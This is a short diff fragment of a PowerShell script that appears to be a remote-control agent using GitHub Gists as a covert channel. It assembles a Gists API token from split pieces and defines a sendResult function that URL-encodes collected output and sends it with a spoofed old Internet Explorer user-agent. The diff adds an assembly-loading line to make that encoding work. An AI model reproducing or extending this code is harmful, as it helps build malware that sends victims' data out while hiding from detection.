@@ -10,6 +10,7 @@ $gistsApiToken=$t1+$t2+$t3;
 
 function sendResult($r){
     try{
+	 Add-Type -AssemblyName System.Web;
      $encodeResult=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$r))
      
      $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
